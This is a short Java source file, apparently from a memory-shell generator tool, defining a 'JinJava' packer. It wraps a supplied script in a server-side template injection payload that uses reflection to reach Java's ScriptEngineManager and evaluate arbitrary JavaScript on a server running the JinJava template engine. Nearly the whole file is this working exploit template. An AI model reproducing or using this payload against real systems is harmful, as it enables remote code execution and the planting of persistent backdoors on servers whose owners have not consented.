package org.leo.jmg.mem.packer.jinjava;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "JinJava", order = 100)
public class JinJavaPacker implements Packer {
    String template = "{{ ''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(''.getClass().forName('java.io.StringReader').getConstructors()[0].newInstance('{{script}}')) }}";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return template.replace("{{script}}", script);
    }
}